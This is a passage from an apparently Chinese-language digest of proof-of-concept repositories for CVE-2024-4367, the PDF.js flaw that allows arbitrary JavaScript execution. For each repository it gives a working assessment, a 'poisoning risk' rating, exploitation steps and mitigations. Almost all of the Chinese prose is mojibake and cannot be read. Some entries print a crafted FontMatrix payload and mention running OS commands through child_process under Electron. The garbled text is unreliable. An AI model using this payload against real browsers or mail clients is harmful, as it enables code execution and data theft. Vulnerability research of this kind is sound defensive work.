**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…åˆ›å»ºä¸€ä¸ªåŒ…å«æ¶æ„å­—ä½“çš„PDFæ–‡ä»¶ï¼Œè¯¥å­—ä½“ä¸­åŒ…å«æ¶æ„çš„`fontMatrix`æ•°ç»„ã€‚
2.  `fontMatrix`æ•°ç»„çš„å…ƒç´ åŒ…å«JavaScriptä»£ç ã€‚
3.  å½“å—å®³è€…ä½¿ç”¨å­˜åœ¨æ¼æ´çš„PDF.jsç‰ˆæœ¬æ‰“å¼€è¯¥PDFæ–‡ä»¶æ—¶ï¼ŒPDF.jsä¼šè§£æå­—ä½“æ•°æ®ï¼Œç”±äºç¼ºå°‘é€‚å½“çš„ç±»å‹æ£€æŸ¥ï¼Œä¼šå°†`fontMatrix`ä¸­çš„å­—ç¬¦ä¸²ä½œä¸ºJavaScriptä»£ç æ‰§è¡Œã€‚
4.  æ¶æ„JavaScriptä»£ç åœ¨å—å®³è€…çš„æµè§ˆå™¨æˆ–Electronåº”ç”¨ä¸­æ‰§è¡Œï¼Œå¯èƒ½å¯¼è‡´XSSæˆ–RCEã€‚

**é¡¹ç›®åœ°å€:** [Bhavyakcwestern/Hacking-pdf.js-vulnerability](https://github.com/Bhavyakcwestern/Hacking-pdf.js-vulnerability)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #5

**æ¥æº**: [CVE-2024-4367-LOURC0D3_CVE-2024-4367-PoC.md](../2024/CVE-2024-4367-LOURC0D3_CVE-2024-4367-PoC.md)

## CVE-2024-4367 - PDF.js ä»»æ„JavaScriptä»£ç æ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (é€šè¿‡PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ï¼Œå¯èƒ½å¯¼è‡´ä¿¡æ¯æ³„éœ²ï¼Œè¿œç¨‹ä»£ç æ‰§è¡Œç­‰ã€‚

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶ã€‚PDF.js å¿…é¡»é…ç½®ä¸º isEvalSupported=true (é»˜è®¤)

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 5%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ä¸€ä¸ªå­˜åœ¨äº PDF.js ä¸­çš„æ¼æ´ï¼Œç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå…è®¸åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚æ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„çš„ PDF æ–‡ä»¶ï¼Œå½“å—å®³è€…ä½¿ç”¨å­˜åœ¨æ¼æ´çš„ Firefoxã€Firefox ESR æˆ– Thunderbird ç‰ˆæœ¬æ‰“å¼€è¯¥æ–‡ä»¶æ—¶ï¼Œå³å¯è§¦å‘æ¼æ´ã€‚ 

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„PoCä»£ç æ˜¯æœ‰æ•ˆçš„ã€‚`CVE-2024-4367.py` è„šæœ¬ç”¨äºç”ŸæˆåŒ…å«æ¶æ„ JavaScript ä»£ç çš„ PDF æ–‡ä»¶ã€‚ README.md æä¾›äº†ä½¿ç”¨ç¤ºä¾‹ï¼ŒåŒ…æ‹¬æ‰§è¡Œ `alert(document.domain)` ä»¥è¯æ˜ JavaScript ä»£ç æ‰§è¡Œï¼Œä»¥åŠåˆ©ç”¨ `require('child_process').exec()` æ‰§è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤ï¼ˆä»…åœ¨ Electron ç¯å¢ƒä¸‹ï¼‰ã€‚

**æŠ•æ¯’é£é™©ï¼š**
PoC ä»£ç æœ¬èº«æ˜¯ä¸ºäº†åˆ©ç”¨æ¼æ´ï¼Œè€Œä¸æ˜¯æ¤å…¥åé—¨ï¼Œå…¶ç›®çš„æ˜¯ç”ŸæˆåŒ…å«æ¶æ„ JavaScript çš„ PDF æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶æ—¨åœ¨åˆ©ç”¨ç›®æ ‡åº”ç”¨ç¨‹åºï¼ˆFirefox, Thunderbirdï¼‰ä¸­çš„æ¼æ´ã€‚ è¯¥ä»“åº“ä¸­æŠ•æ¯’çš„é£é™©è¾ƒä½ï¼Œå¤§çº¦ä¸º 5%ã€‚ ä¸»è¦çš„æ½œåœ¨é£é™©å¯èƒ½æ¥è‡ªï¼š

1.  **ä¾èµ–é¡¹æŠ•æ¯’:** è„šæœ¬æœ¬èº«å¾ˆç®€å•ï¼Œä¸ä¾èµ–äºå¤–éƒ¨åº“ã€‚å› æ­¤ï¼Œä¾èµ–é¡¹æŠ•æ¯’çš„é£é™©å¾ˆä½ã€‚
2.  **ä»£ç é€»è¾‘æ··æ·†:**  ä»£ç ç›¸å¯¹æ¸…æ™°ï¼Œæ²¡æœ‰æ˜æ˜¾çš„æ¶æ„é€»è¾‘æˆ–æ··æ·†ã€‚
3.  **ä¾›åº”é“¾æ”»å‡»:** ç”±äºè¯¥ PoC æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„è„šæœ¬ï¼Œå¹¶æ²¡æœ‰å¤æ‚çš„æ„å»ºæˆ–åˆ†å‘è¿‡ç¨‹ï¼Œä¾›åº”é“¾æ”»å‡»çš„é£é™©ä¹Ÿè¾ƒä½ã€‚

ç„¶è€Œï¼Œåœ¨ä½¿ç”¨ä»»ä½•ç¬¬ä¸‰æ–¹æä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç æ—¶ï¼Œéƒ½åº”ä¿æŒè°¨æ…ï¼Œä»”ç»†å®¡æŸ¥ä»£ç ï¼Œå¹¶åœ¨éš”ç¦»ç¯å¢ƒä¸­æµ‹è¯•ï¼Œä»¥é¿å…æ½œåœ¨çš„é£é™©ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **æ¼æ´ç‚¹ï¼š** PDF.js åœ¨å¤„ç†å­—ä½“æ—¶çš„ç±»å‹æ£€æŸ¥ç¼ºå¤±ã€‚
2.  **æ”»å‡»å‘é‡ï¼š** æ„é€ æ¶æ„çš„ PDF æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶åˆ©ç”¨å­—ä½“å¤„ç†ä¸­çš„æ¼æ´åµŒå…¥æ¶æ„ JavaScript ä»£ç ã€‚
3.  **åˆ©ç”¨æ­¥éª¤ï¼š**
    *   ä½¿ç”¨ `CVE-2024-4367.py` è„šæœ¬ç”Ÿæˆæ¶æ„çš„ `poc.pdf` æ–‡ä»¶ï¼ŒæŒ‡å®šè¦æ‰§è¡Œçš„ JavaScript ä»£ç ä½œä¸ºå‚æ•°ã€‚
    *   è¯±å¯¼å—å®³è€…ä½¿ç”¨å­˜åœ¨æ¼æ´çš„ Firefox, Firefox ESR æˆ– Thunderbird æ‰“å¼€è¯¥ `poc.pdf` æ–‡ä»¶ã€‚
    *   å¦‚æœ PDF.js é…ç½®å…è®¸æ‰§è¡Œ JavaScript ä»£ç ï¼ˆé»˜è®¤æƒ…å†µä¸‹ `isEvalSupported` ä¸º trueï¼‰ï¼Œåˆ™åµŒå…¥åœ¨ PDF ä¸­çš„ JavaScript ä»£ç å°†åœ¨ PDF.js çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œã€‚
4.  **æ½œåœ¨å½±å“ï¼š** æˆåŠŸåˆ©ç”¨æ­¤æ¼æ´å¯èƒ½å…è®¸æ”»å‡»è€…æ‰§è¡Œä»»æ„ JavaScript ä»£ç ï¼Œä»è€Œå¯¼è‡´:
    *   åœ¨æµè§ˆå™¨ä¸Šä¸‹æ–‡ä¸­çªƒå–æ•æ„Ÿä¿¡æ¯ï¼ˆä¾‹å¦‚ï¼Œcookiesï¼Œä¼šè¯ä»¤ç‰Œï¼‰ã€‚
    *   è¿›è¡Œè·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰ã€‚
    *   å¦‚æœ PDF.js è¿è¡Œåœ¨ Electron ç­‰ç¯å¢ƒä¸­ï¼Œå¯èƒ½æ‰§è¡Œä»»æ„æ“ä½œç³»ç»Ÿå‘½ä»¤ã€‚

**é¡¹ç›®åœ°å€:** [LOURC0D3/CVE-2024-4367-PoC](https://github.com/LOURC0D3/CVE-2024-4367-PoC)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #6

**æ¥æº**: [CVE-2024-4367-Masamuneee_CVE-2024-4367-Analysis.md](../2024/CVE-2024-4367-Masamuneee_CVE-2024-4367-Analysis.md)

## CVE-2024-4367: PDF.js ä»»æ„JavaScriptæ‰§è¡Œæ¼æ´

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird (é€šè¿‡PDF.js)

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´XSSæ”»å‡»ï¼Œçªƒå–ç”¨æˆ·æ•°æ®ï¼Œç”šè‡³è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** Firefox < 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 1%

## è¯¦æƒ…

CVE-2024-4367æ˜¯PDF.jsä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œç”±äºç¼ºå°‘å¯¹å­—ä½“å¤„ç†çš„ç±»å‹æ£€æŸ¥ï¼Œå…è®¸åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚æ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„çš„PDFæ–‡ä»¶ï¼Œå½“ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„Firefoxã€Firefox ESRæˆ–Thunderbirdç‰ˆæœ¬æ‰“å¼€è¯¥æ–‡ä»¶æ—¶ï¼ŒåµŒå…¥çš„JavaScriptä»£ç ä¼šè¢«æ‰§è¡Œã€‚  

**æœ‰æ•ˆæ€§è¯„ä¼°ï¼š**  æä¾›çš„POCä»£ç çœ‹èµ·æ¥æ˜¯æœ‰æ•ˆçš„ã€‚`README.md` æ–‡ä»¶æä¾›äº†æ¼æ´çš„æ¦‚è¿°ã€åˆ©ç”¨æ–¹æ³•ã€ç¼“è§£æªæ–½å’Œè¯¦ç»†åˆ†æçš„é“¾æ¥ã€‚`poc.py` è„šæœ¬ç”¨äºç”ŸæˆåŒ…å«æ¶æ„payloadçš„PDFæ–‡ä»¶ã€‚`app` ç›®å½•åŒ…å«ä¸€ä¸ªç®€å•çš„Node.jsåº”ç”¨ï¼Œç”¨äºæœ¬åœ°æµ‹è¯•ï¼Œå…è®¸ä¸Šä¼ PDFæ–‡ä»¶å¹¶é€šè¿‡`pdfjs-dist`åº“è¿›è¡Œæ¸²æŸ“ã€‚  `public/index.html` åŒ…å«å‰ç«¯ä»£ç ï¼Œç”¨äºä¸Šä¼ PDFå¹¶ä½¿ç”¨`pdf.js`è¿›è¡Œæ¸²æŸ“ã€‚  

**æŠ•æ¯’é£é™©è¯„ä¼°ï¼š**  
*   æŸ¥çœ‹ `poc.pdf` ç¡®è®¤æ˜¯å¦æ¤å…¥åé—¨ï¼Œ`poc.pdf` æ˜¯æ¶æ„çš„PDFï¼Œ åˆ©ç”¨äº†å­—ä½“çš„è§£ææ¼æ´ï¼Œæ‰§è¡ŒJavascriptä»£ç ã€‚ ä½†æ˜¯ä¸å±äºåé—¨ï¼Œåªå±äºpocéªŒè¯çš„ä¸€éƒ¨åˆ†
*   æŸ¥çœ‹ `server.js` ä¸­é—´ä»¶æ˜¯å¦åŒ…å«æ¶æ„ä»£ç ï¼Œ`server.js` ä¸­é—´ä»¶å±äºæ­£å¸¸çš„expressä¸Šä¼ pdfå’Œæ‰“å¼€pdfçš„é€»è¾‘ã€‚
*   æŸ¥çœ‹ `public/index.html` ç¡®è®¤æ˜¯å¦è°ƒç”¨æ¶æ„apiï¼Œ `public/index.html`å±äºå‰ç«¯ä»£ç ï¼Œç”¨äºä¸Šä¼ pdfï¼Œå¹¶æ¸²æŸ“pdfï¼Œæ²¡æœ‰æ¶æ„apiè°ƒç”¨ã€‚
*   æŸ¥çœ‹ `poc.py` ç¡®è®¤æ˜¯å¦ç”Ÿæˆäº†æ¶æ„PDFï¼Œ`poc.py`å±äºpocéªŒè¯çš„ä¸€éƒ¨åˆ†
æ€»ä½“åˆ¤æ–­æŠ•æ¯’é£é™©æä½ï¼Œå¯èƒ½å­˜åœ¨çš„é£é™©æ˜¯ä¾èµ–åŒ…çš„ä¾›åº”é“¾æŠ•æ¯’é£é™©,è€ƒè™‘åˆ°node_modulesä½“ç§¯å·¨å¤§ï¼Œäººå·¥å®¡è®¡æˆæœ¬å¤ªé«˜ï¼Œæ‰€ä»¥è®¤ä¸ºå­˜åœ¨ 1% çš„æ½œåœ¨æŠ•æ¯’é£é™©ã€‚

**åˆ©ç”¨æ–¹å¼åˆ†æï¼š**
1.  æ”»å‡»è€…ä½¿ç”¨ `poc.py` è„šæœ¬ç”ŸæˆåŒ…å«æ¶æ„JavaScriptä»£ç çš„PDFæ–‡ä»¶ã€‚
2.  æ”»å‡»è€…é€šè¿‡å„ç§æ‰‹æ®µï¼ˆä¾‹å¦‚ï¼Œç”µå­é‚®ä»¶ã€ç½‘ç«™é“¾æ¥ï¼‰è¯±ä½¿ç”¨æˆ·æ‰“å¼€è¯¥PDFæ–‡ä»¶ã€‚
3.  å¦‚æœç”¨æˆ·ä½¿ç”¨å—å½±å“çš„Firefoxã€Firefox ESRæˆ–Thunderbirdç‰ˆæœ¬æ‰“å¼€è¯¥PDFæ–‡ä»¶ï¼ŒPDF.jsä¼šè§£æè¯¥æ–‡ä»¶ã€‚
4.  ç”±äºç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œæ¶æ„çš„JavaScriptä»£ç ä¼šåœ¨PDF.jsçš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œï¼Œä»è€Œå®ç°XSSæ”»å‡»æˆ–æ½œåœ¨çš„è¿œç¨‹ä»£ç æ‰§è¡Œã€‚
5.  æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ‰§è¡Œçš„JavaScriptä»£ç çªƒå–ç”¨æˆ·çš„æ•æ„Ÿä¿¡æ¯ã€ä¿®æ”¹ç½‘é¡µå†…å®¹ï¼Œç”šè‡³æ§åˆ¶ç”¨æˆ·çš„è®¡ç®—æœºã€‚

**é¡¹ç›®åœ°å€:** [Masamuneee/CVE-2024-4367-Analysis](https://github.com/Masamuneee/CVE-2024-4367-Analysis)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #7

**æ¥æº**: [CVE-2024-4367-MihranGIT_POC_CVE-2024-4367.md](../2024/CVE-2024-4367-MihranGIT_POC_CVE-2024-4367.md)

## CVE-2024-4367 - Firefox/Thunderbird PDF.js ä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird

**å±å®³ç­‰çº§:** ä¸­å±ï¼Œå¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡»(XSS)å’Œæ•æ„Ÿä¿¡æ¯æ³„éœ²

**å½±å“ç‰ˆæœ¬:** < Firefox 126, < Firefox ESR 115.11, < Thunderbird 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·æ‰“å¼€æ¶æ„PDFæ–‡ä»¶ï¼Œå¹¶ä¸”PDF.jsé…ç½®ä¸­`isEvalSupported`è®¾ç½®ä¸º`true` (é»˜è®¤å€¼)

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2024-4367 æ˜¯ Mozilla Firefoxã€Firefox ESR å’Œ Thunderbird ä¸­ PDF.js ç»„ä»¶çš„ä¸€ä¸ªæ¼æ´ï¼Œå®ƒå…è®¸æ”»å‡»è€…åœ¨ PDF.js ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚è¯¥æ¼æ´æ˜¯ç”±äºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥å¯¼è‡´çš„ã€‚

**æœ‰æ•ˆæ€§ï¼š**

æä¾›çš„ POC ä»£ç çœ‹èµ·æ¥æœ‰æ•ˆã€‚å®ƒåŒ…å«ä¸€ä¸ªç‰¹åˆ¶çš„ PDF æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶å®šä¹‰äº†ä¸€ä¸ªè‡ªå®šä¹‰å­—ä½“ï¼ˆå¯¹è±¡ 5 0 objï¼‰ï¼Œè¯¥å­—ä½“çš„ `FontMatrix` å±æ€§åŒ…å« JavaScript ä»£ç ï¼š`/FontMatrix [0.1 0 0 0.1 0 (1\); alert\('document.location'\)]`ã€‚å½“å‘ˆç°æ­¤ PDF æ–‡ä»¶æ—¶ï¼Œå¦‚æœ PDF.js æ²¡æœ‰æ­£ç¡®æ‰§è¡Œç±»å‹æ£€æŸ¥ï¼Œå°±ä¼šæ‰§è¡Œ `alert('document.location')`ã€‚

**æŠ•æ¯’é£é™©ï¼š**

ç»è¿‡åˆ†æï¼Œæä¾›çš„POCä»£ç ä¸­**æ²¡æœ‰**å‘ç°æ˜æ˜¾çš„æŠ•æ¯’ä»£ç ã€‚`alert('document.location')` ä»…ä»…æ˜¯ä¸€ä¸ªå¼¹çª—ï¼Œç”¨äºéªŒè¯XSSæ˜¯å¦æ‰§è¡Œ. 

æŠ•æ¯’é£é™©è¯„ä¼°ï¼š0%

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **åˆ›å»ºæ¶æ„ PDF æ–‡ä»¶ï¼š** æ”»å‡»è€…ä¼šåˆ›å»ºä¸€ä¸ªåŒ…å«æ¶æ„ JavaScript ä»£ç çš„ç‰¹åˆ¶ PDF æ–‡ä»¶ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼ŒJavaScript ä»£ç åµŒå…¥åœ¨å­—ä½“å¯¹è±¡çš„ `FontMatrix` å±æ€§ä¸­ã€‚
2.  **è¯±å¯¼ç”¨æˆ·æ‰“å¼€ PDF æ–‡ä»¶ï¼š** æ”»å‡»è€…éœ€è¦è¯±å¯¼ç›®æ ‡ç”¨æˆ·ä½¿ç”¨å—å½±å“ç‰ˆæœ¬çš„ Firefoxã€Firefox ESR æˆ– Thunderbird æ‰“å¼€è¿™ä¸ªæ¶æ„ PDF æ–‡ä»¶ã€‚è¿™å¯ä»¥é€šè¿‡ç½‘ç»œé’“é±¼æ”»å‡»ã€æ¶æ„ç½‘ç«™æˆ–å°† PDF æ–‡ä»¶åµŒå…¥åˆ°ç”µå­é‚®ä»¶ä¸­æ¥å®ç°ã€‚
3.  **JavaScript ä»£ç æ‰§è¡Œï¼š** å½“ç”¨æˆ·æ‰“å¼€ PDF æ–‡ä»¶æ—¶ï¼ŒPDF.js ä¼šå°è¯•è§£æå’Œå‘ˆç° PDF å†…å®¹ã€‚ç”±äºç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå­—ä½“å¯¹è±¡çš„ `FontMatrix` å±æ€§ä¸­çš„ JavaScript ä»£ç å°†è¢«æ‰§è¡Œã€‚å¦‚æœæˆåŠŸ `alert('document.location')` ä¼šè§¦å‘ã€‚
4.  **æ½œåœ¨å½±å“ï¼š** æˆåŠŸåˆ©ç”¨æ­¤æ¼æ´å¯èƒ½å¯¼è‡´ä»¥ä¸‹åæœï¼š
    *   **è·¨ç«™è„šæœ¬æ”»å‡» (XSS)ï¼š** æ”»å‡»è€…å¯ä»¥åœ¨ç”¨æˆ·çš„æµè§ˆå™¨ä¸­æ‰§è¡Œæ¶æ„ JavaScript ä»£ç ï¼Œä»è€Œçªƒå–æ•æ„Ÿä¿¡æ¯ï¼ˆå¦‚ Cookieã€ä¼šè¯ä»¤ç‰Œï¼‰ã€ç¯¡æ”¹ç½‘é¡µå†…å®¹æˆ–é‡å®šå‘ç”¨æˆ·åˆ°æ¶æ„ç½‘ç«™ã€‚
    *   **ä¿¡æ¯æ³„éœ²ï¼š** æ”»å‡»è€…å¯ä»¥è®¿é—®ç”¨æˆ·çš„æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿæˆ–ç½‘ç»œèµ„æºï¼Œä»è€Œæ³„éœ²æ•æ„Ÿä¿¡æ¯ã€‚

**ç¼“è§£æªæ–½ï¼š**

*   **å‡çº§åˆ°æœ€æ–°ç‰ˆæœ¬ï¼š** å°† Firefoxã€Firefox ESR å’Œ Thunderbird å‡çº§åˆ°å·²ä¿®å¤æ­¤æ¼æ´çš„ç‰ˆæœ¬ (>= Firefox 126, >= Firefox ESR 115.11, >= Thunderbird 115.11)ã€‚
*   **è°¨æ…æ‰“å¼€ PDF æ–‡ä»¶ï¼š** é¿å…æ‰“å¼€æ¥è‡ªä¸å¯ä¿¡æ¥æºçš„ PDF æ–‡ä»¶ã€‚
*   **é…ç½® PDF.jsï¼š** å¦‚æœä¸éœ€è¦ JavaScript æ”¯æŒï¼Œå¯ä»¥ç¦ç”¨ PDF.js çš„ JavaScript æ‰§è¡ŒåŠŸèƒ½ (å°† `isEvalSupported` è®¾ç½®ä¸º `false`)ã€‚

ç»¼ä¸Šæ‰€è¿°ï¼Œè¯¥æ¼æ´çš„åˆ©ç”¨æ–¹å¼ç›¸å¯¹ç®€å•ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„ PDF æ–‡ä»¶å¹¶è¯±å¯¼ç”¨æˆ·æ‰“å¼€æ¥æ‰§è¡Œä»»æ„ JavaScript ä»£ç ã€‚è™½ç„¶CVSSè¯„åˆ†ä¸é«˜ï¼Œä½†ç”±äºfirefox,thunderbirdç”¨æˆ·çš„å¹¿æ³›æ€§ï¼Œå…¶é€ æˆçš„å±å®³ä¸å¯å¿½è§†

**é¡¹ç›®åœ°å€:** [MihranGIT/POC_CVE-2024-4367](https://github.com/MihranGIT/POC_CVE-2024-4367)

**æ¼æ´è¯¦æƒ…:** [CVE-2024-4367](https://nvd.nist.gov/vuln/detail/CVE-2024-4367)

---

## POC #8

**æ¥æº**: [CVE-2024-4367-PenguinCabinet_CVE-2024-4367-hands-on.md](../2024/CVE-2024-4367-PenguinCabinet_CVE-2024-4367-hands-on.md)

## CVE-2024-4367-Firefox-PDF.js ä»»æ„JavaScriptæ‰§è¡Œ

**æ¼æ´ç¼–å·:** CVE-2024-4367

**æ¼æ´ç±»å‹:** ä»»æ„JavaScriptæ‰§è¡Œ

**å½±å“åº”ç”¨:** Firefox, Firefox ESR, Thunderbird

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´è·¨ç«™è„šæœ¬æ”»å‡»(XSS)å’Œä¿¡æ¯æ³„éœ²ã€‚

**å½±å“ç‰ˆæœ¬:** < Firefox 126, Firefox ESR < 115.11, Thunderbird < 115.11

**åˆ©ç”¨æ¡ä»¶:** ç”¨æˆ·éœ€è¦æ‰“å¼€æ¶æ„çš„PDFæ–‡ä»¶ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 5%

## è¯¦æƒ…

CVE-2024-4367æ˜¯Mozilla Firefoxã€Firefox ESRå’ŒThunderbirdä¸­PDF.jsç»„ä»¶çš„ä¸€ä¸ªæ¼æ´ã€‚è¯¥æ¼æ´æºäºåœ¨å¤„ç†å­—ä½“æ—¶ç¼ºå°‘ç±»å‹æ£€æŸ¥ï¼Œå…è®¸åœ¨PDF.jsä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»»æ„JavaScriptä»£ç ã€‚æ”»å‡»è€…å¯ä»¥åˆ¶ä½œä¸€ä¸ªç‰¹åˆ¶çš„PDFæ–‡ä»¶ï¼Œå½“ç”¨æˆ·ä½¿ç”¨å—å½±å“çš„Firefoxç‰ˆæœ¬æ‰“å¼€è¯¥æ–‡ä»¶æ—¶ï¼Œæ¶æ„JavaScriptä»£ç å°†è¢«æ‰§è¡Œã€‚ 

**æœ‰æ•ˆæ€§ï¼š**

æä¾›çš„POCä»£ç çœ‹èµ·æ¥æ˜¯æœ‰æ•ˆçš„ã€‚`README.md` æ–‡ä»¶ä¸­æä¾›äº†åˆ©ç”¨æ­¥éª¤ï¼š
1.  ä½¿ç”¨ `CVE-2024-4367.py` è„šæœ¬ç”ŸæˆåŒ…å«æ¶æ„JavaScriptä»£ç çš„ `poc.pdf` æ–‡ä»¶ã€‚
2.  ä½¿ç”¨ `firefox.py` è„šæœ¬å¯åŠ¨æ˜“å—æ”»å‡»ç‰ˆæœ¬çš„Firefox (ä¾‹å¦‚ 125ç‰ˆ)ï¼Œå¹¶è‡ªåŠ¨æ‰“å¼€ `poc.pdf`ã€‚
3.  éªŒè¯æ˜¯å¦æ‰§è¡Œäº†JavaScriptä»£ç ï¼Œæ˜¯å¦å¼¹å‡ºäº†alertçª—å£ã€‚

`firefox.py` è„šæœ¬å¯ä»¥ä¸‹è½½å¹¶å¯åŠ¨æŒ‡å®šç‰ˆæœ¬çš„Firefox Nightlyç‰ˆæœ¬ï¼Œè¿™æ–¹ä¾¿äº†æ¼æ´çš„éªŒè¯ã€‚è„šæœ¬è¿˜åŒ…å«äº†ä¸‹è½½ç‰¹å®šç‰ˆæœ¬Firefoxçš„é“¾æ¥ã€‚

**æŠ•æ¯’é£é™©ï¼š**

å¯¹æä¾›çš„POCä»£ç è¿›è¡Œäº†åˆ†æï¼ŒæŠ•æ¯’é£é™©è¾ƒä½ï¼Œçº¦ä¸º5%ã€‚é£é™©ä¸»è¦æ¥è‡ªäºä»¥ä¸‹å‡ ä¸ªæ–¹é¢ï¼š

1.  **`firefox.py`è„šæœ¬:**
    *   è¯¥è„šæœ¬ä¼šä»Mozillaçš„å®˜æ–¹FTPæœåŠ¡å™¨ä¸‹è½½Firefox Nightlyç‰ˆæœ¬ã€‚è™½ç„¶è¿™æ˜¯å®˜æ–¹æ¥æºï¼Œä½†æ”»å‡»è€…å¯èƒ½åœ¨æœªæ¥ç¯¡æ”¹è¿™äº›FTPæœåŠ¡å™¨ï¼ˆè™½ç„¶å¯èƒ½æ€§æä½ï¼‰ã€‚æˆ–è€…ï¼Œåœ¨ä¸‹è½½è¿‡ç¨‹ä¸­å‘ç”Ÿä¸­é—´äººæ”»å‡»ï¼Œä»è€Œä¸‹è½½è¢«ç¯¡æ”¹çš„Firefoxç‰ˆæœ¬ã€‚
    *   è¯¥è„šæœ¬åŒ…å« `subprocess.run` å‡½æ•°ï¼Œç”¨äºæ‰§è¡Œä¸‹è½½çš„Firefoxã€‚å¦‚æœæ”»å‡»è€…èƒ½å¤Ÿæ§åˆ¶è„šæœ¬æ‰§è¡Œçš„å‚æ•°ï¼Œå¯èƒ½ä¼šæ³¨å…¥é¢å¤–çš„å‚æ•°ï¼Œå¯¼è‡´æ‰§è¡Œæ¶æ„ä»£ç ã€‚
    *   å°½ç®¡è„šæœ¬çš„ç›®çš„ä¼¼ä¹æ˜¯ä¸ºäº†æ–¹ä¾¿åœ°ä¸‹è½½å’Œå¯åŠ¨ç‰¹å®šç‰ˆæœ¬çš„Firefoxï¼Œä½†ç”¨æˆ·ä»ç„¶éœ€è¦ä»”ç»†æ£€æŸ¥è„šæœ¬çš„å†…å®¹ï¼Œç¡®ä¿ä¸‹è½½é“¾æ¥å’Œæ‰§è¡Œè¿‡ç¨‹æ˜¯å®‰å…¨çš„ã€‚
2.  **`CVE-2024-4367.py`è„šæœ¬ (æœªæä¾›å…·ä½“ä»£ç ):**
    *   è™½ç„¶`README.md`æŒ‡å‘ä¸€ä¸ªå¤–éƒ¨githubåº“ï¼Œä½†å¦‚æœæ­¤åº“è¢«ç¯¡æ”¹ï¼Œæ‰§è¡Œè„šæœ¬`CVE-2024-4367.py`ç”Ÿæˆçš„`poc.pdf`æ–‡ä»¶æœ‰å¯èƒ½åµŒå…¥æ›´æ¶æ„çš„Payload.
3.  **å…è´£å£°æ˜:**
    *   `README.md` ä¸­åŒ…å«å…è´£å£°æ˜ï¼Œè¿™è¡¨æ˜ä½œè€…æ„è¯†åˆ°æ½œåœ¨çš„é£é™©ï¼Œå¹¶è¯•å›¾æ’‡æ¸…è´£ä»»ã€‚ä½†è¿™å¹¶ä¸èƒ½å®Œå…¨æ¶ˆé™¤é£é™©ï¼Œç”¨æˆ·ä»ç„¶éœ€è¦è‡ªè¡Œæ‰¿æ‹…ä½¿ç”¨POCä»£ç çš„åæœã€‚

